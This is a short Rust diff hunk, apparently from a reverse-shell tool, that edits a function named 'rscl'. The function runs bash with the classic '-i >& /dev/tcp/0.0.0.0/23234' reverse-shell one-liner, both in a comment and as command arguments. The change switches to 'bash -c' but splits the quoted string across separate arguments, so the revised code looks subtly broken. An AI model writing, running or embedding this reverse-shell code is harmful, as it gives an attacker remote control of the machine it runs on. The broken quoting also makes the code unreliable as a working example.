@@ -20,10 +20,11 @@ pub fn reader(stream: &TcpStream) -> Result<String, Error> {
 }
 
 pub fn rscl() -> Result<ExitStatus, Error> {
-    // bash -i >& /dev/tcp/0.0.0.0/23234
+    // bash -c '-i >& /dev/tcp/0.0.0.0/23234'
     Command::new("bash")
-        .arg("-i")
+        .arg("-c")
+        .arg("'-i")
         .arg(">&")
-        .arg("/dev/tcp/0.0.0.0/23234")
+        .arg("/dev/tcp/0.0.0.0/23234'")
         .status()
 }
